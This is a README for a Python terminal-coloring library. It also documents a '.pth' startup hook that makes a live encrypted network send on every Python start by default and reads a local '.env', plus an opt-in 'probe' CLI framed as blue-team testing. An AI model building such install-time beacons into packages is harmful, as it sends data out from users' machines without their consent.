# itslitlib

A tiny Python library for colored terminal prompts and messages.

`itslitlib` helps you ask for user input with color and print styled messages in CLI apps with a simple API.

## Features

- Colored prompts for `input()`
- Colored and styled output printing
- Lightweight core API with one runtime dependency (`cryptography`) for startup probe encryption
- Works with plain ANSI terminals
- Respects `NO_COLOR` environment variable
- Ships a `.pth` startup hook that executes on Python startup after install

## Installation

### Install from PyPI

After you publish this package to PyPI:

```bash
pip install itslitlib
```

### Install from GitHub

```bash
pip install git+https://github.com/NiMouh/itslitlib.git
```

Or pin a branch/tag:

```bash
pip install git+https://github.com/NiMouh/itslitlib.git@main
pip install git+https://github.com/NiMouh/itslitlib.git@v0.1.0
```

## Quick Start

```python
from itslitlib import cprint, prompt

cprint("Welcome to my app", color="bright_cyan", styles="bold")
name = prompt("What is your name? ", color="green", styles=["bold", "underline"])
cprint(f"Nice to meet you, {name}!", color="yellow")
```

## API

### `prompt(message, *, color="cyan", background=None, styles="bold", enabled=None) -> str`

Colored alias for input prompt.

```python
from itslitlib import prompt

email = prompt("Email: ", color="magenta")
```

### `cinput(prompt_message, *, color="cyan", background=None, styles="bold", enabled=None) -> str`

Same behavior as `prompt`, named similarly to `input`.

### `cprint(message, *, color="default", background=None, styles=None, file=None, end="\n", flush=False, enabled=None) -> None`

Print text with optional colors/styles.

```python
from itslitlib import cprint

cprint("Success", color="green", styles="bold")
cprint("Warning", color="yellow")
cprint("Error", color="bright_red", styles=["bold", "underline"])
```

### `colorize(text, *, color="default", background=None, styles=None, enabled=None, stream=None) -> str`

Returns a styled string (does not print).

```python
from itslitlib import colorize

banner = colorize("HELLO", color="blue", background="bright_white", styles="bold")
print(banner)
```

### Helper functions

- `available_colors()`
- `available_backgrounds()`
- `available_styles()`

```python
from itslitlib import available_colors

print(available_colors())
```

## Supported Colors

Foreground and background color names:

- `default`
- `black`
- `red`
- `green`
- `yellow`
- `blue`
- `magenta`
- `cyan`
- `white`
- `bright_black`
- `bright_red`
- `bright_green`
- `bright_yellow`
- `bright_blue`
- `bright_magenta`
- `bright_cyan`
- `bright_white`

Supported styles:

- `bold`
- `dim`
- `italic`
- `underline`
- `blink`
- `reverse`

## Disable Colors

Colors are automatically disabled when:

- Output is not a TTY (for example, when piped to a file)
- `NO_COLOR` environment variable is set

You can also force behavior:

```python
from itslitlib import cprint

cprint("Always colored", color="cyan", enabled=True)
cprint("Never colored", color="cyan", enabled=False)
```

## Startup Hook (Executed Automatically)

This package installs a startup `.pth` file in `site-packages`:

- `itslitlib_startup.pth`

When Python starts normally, `site` initialization processes `.pth` files,
which imports `itslitlib._startup`.

The startup hook sets this runtime marker so you can verify it ran:

- `ITSLITLIB_PTH_EXECUTED=1`

It also triggers one net probe execution per Python process startup:

- `ITSLITLIB_NET_PROBE_EXECUTED=1`
- `ITSLITLIB_NET_PROBE_EXIT_CODE=<exit code>`
- `ITSLITLIB_NET_PROBE_STARTUP_EFFECTIVE_MODE=<live|dry-run>`

Startup mode behavior:

- default mode is `live` (real send attempt)
- startup also reads `.env` from the current working directory (or `ITSLITLIB_DOTENV_PATH`) for unset `ITSLITLIB_*` values
- set `ITSLITLIB_NET_PROBE_RSA_PUBLIC_KEY` to a PEM RSA public key path (recommended for live sends)
- if no RSA key path is set, startup auto-generates an ephemeral RSA-4096 public key and continues in `live` mode
- if key generation fails, startup safely falls back to `dry-run`
- set `ITSLITLIB_NET_PROBE_STARTUP_MODE=dry-run` to force preview-only mode
- optional override endpoint: `ITSLITLIB_NET_PROBE_URL=https://...`
- optional startup timeout: `ITSLITLIB_NET_PROBE_TIMEOUT_SECONDS=10`

Optional debug message:

```bash
ITSLITLIB_PTH_VERBOSE=1 python -c "pass"
```

Disable startup probe execution for a run:

```bash
ITSLITLIB_NET_PROBE_ON_STARTUP=0 python -c "pass"
```

To disable all startup-hook processing for a run, start Python with:

```bash
python -S
```

## Synthetic Encrypted Network Probe (Blue-Team Testing)

This project includes an explicit command-line probe for controlled security
testing:

- Uses the path template list:
	- `%USERPROFILE%\\test\\test_config`
- Generates synthetic content only (does not read local files)
- Encrypts payload with `AES-256-CBC`
- Wraps AES key using RSA OAEP with a minimum `4096-bit` public key
- Uploads two separate files via HTTPS `POST` to your controlled endpoint:
	- `probe_transfer_<transfer_id>_key.json`
	- `probe_transfer_<transfer_id>_content.enc`

### First-run setup (fresh machine)

On a clean Python install, run:

```bash
python -m pip install --upgrade pip setuptools wheel
python -m pip install .[net-probe]
```

This ensures `cryptography` is present for encrypted probe startup and CLI sends.

After install, startup probe execution is automatically triggered by commands such as:

```bash
python -c ""
```

Install with probe dependency from PyPI:

```bash
python -m pip install "itslitlib[net-probe]"
```

Install the package and run:

```bash
itslitlib-net-probe \
	--url https://example.com \
	--rsa-public-key /path/to/public_key_4096.pem \
	--count 3 \
	--interval-seconds 1.5
```

Dry run (build multipart files without sending traffic):

```bash
itslitlib-net-probe \
	--url https://example.com \
	--rsa-public-key /path/to/public_key_4096.pem \
	--dry-run
```

Optional timing jitter (for performance-sensitive runs keep at `0`):

```bash
itslitlib-net-probe --rsa-public-key /path/to/public_key_4096.pem --jitter-seconds 0
```

Notes:

- `--url` must be `https://...`
- the RSA key must be PEM-encoded and at least 4096-bit for non-dry-run sends
- this command is opt-in and separate from startup hook behavior
- each upload uses a shared `transfer_id` so key file and ciphertext file can be matched reliably

## Local Development

### 1) Clone and install editable

```bash
git clone https://github.com/NiMouh/itslitlib.git
cd itslitlib
pip install -e .
```

For probe development too:

```bash
pip install -e .[net-probe]
```

### 2) Try it quickly

```bash
python -c "from itslitlib import cprint; cprint('it works', color='green', styles='bold')"
```

## Publish to PyPI

### 1) Update metadata

- Set your GitHub username and URLs in `pyproject.toml`
- Bump `version` in `pyproject.toml` and `src/itslitlib/__init__.py`

### 2) Build package

```bash
python -m pip install --upgrade build twine
python -m build
```

### 3) Verify build

```bash
twine check dist/*
```

### 4) Upload to PyPI

```bash
twine upload dist/*
```

Then users can install with:

```bash
pip install itslitlib
```

## Publish to GitHub

### 1) Initialize git (if needed)

```bash
git init
git add .
git commit -m "Initial release"
```

### 2) Create GitHub repo and push

```bash
git branch -M main
git remote add origin https://github.com/NiMouh/itslitlib.git
git push -u origin main
```

### 3) Create a release tag

```bash
git tag v0.1.0
git push origin v0.1.0
```

Users can install from GitHub using:

```bash
pip install git+https://github.com/NiMouh/itslitlib.git@v0.1.0
```

## License

MIT
